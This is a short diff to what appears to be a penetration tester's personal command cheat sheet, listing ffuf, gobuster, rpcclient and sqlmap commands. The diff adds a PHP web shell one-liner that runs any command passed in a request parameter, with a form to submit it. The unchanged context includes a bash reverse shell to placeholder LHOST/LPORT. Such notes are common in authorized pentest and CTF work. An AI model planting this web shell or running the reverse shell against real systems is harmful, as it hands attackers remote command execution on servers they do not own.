@@ -1,3 +1,5 @@
+https://github.com/melnicek/melnicek.github.io/edit/master/history.txt
+
 ffuf -w wordlist:FUZZ -u http://TARGET/FUZZ
 ffuf -w wordlist:FUZZ -u http://TARGET/FUZZ -recursion -recursion-depth 1 -e .php -v
 ffuf -w wordlist:FUZZ -u https://FUZZ.TARGET/
@@ -24,6 +26,8 @@ rpcclient -U '' -N RHOST
 gobuster dir -w WORDLIST -u URL -o OUTFILE
 
 sqlmap -r REQFILE --batch
+
+<pre><?php system($_REQUEST["yz"])?></pre><hr><form method="POST"><input type="text" id="yz" name="yz"><input type="submit" value="Submit"></form>
 
 bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1'
 
